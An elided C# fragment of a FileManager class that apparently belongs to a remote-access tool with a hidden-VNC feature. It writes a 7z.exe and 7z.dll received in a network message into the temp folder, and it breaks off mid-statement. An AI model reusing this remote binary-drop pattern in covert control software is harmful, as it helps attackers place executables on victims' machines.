    ...
    public class FileManager
    {
        ...
        private void CheckForSevenZip()
        {
            try
            {
                ...
                string pegasushvncSvenzip = Path.Combine(Path.GetTempPath(), "7-Zip", "7z.exe");
                ...
                else if (File.Exists(pegasushvncSvenzip))
                    Packet.ZipPath = pegasushvncSvenzip;
        ...
        private void InstallSevenZip(MsgPack unpack_msgpack)
        {
            try
            {
                string pegasushvncSvenzip = Path.Combine(Path.GetTempPath(), "7-Zip");
                if (!Directory.Exists(pegasushvncSvenzip))
                {
                    Directory.CreateDirectory(pegasushvncSvenzip);
                }

                using (FileStream fs = new FileStream(Path.Combine(pegasushvncSvenzip, "7z.exe"), FileMode.Create))
                    fs.Write(unpack_msgpack.ForcePathObject("exe").GetAsBytes(), 0, unpack_msgpack.ForcePathObject("exe").GetAsBytes().Length);

                using (FileStream fs = new FileStream(Path.Combine(pegasushvncSvenzip, "7z.dll"), FileMode.Create))
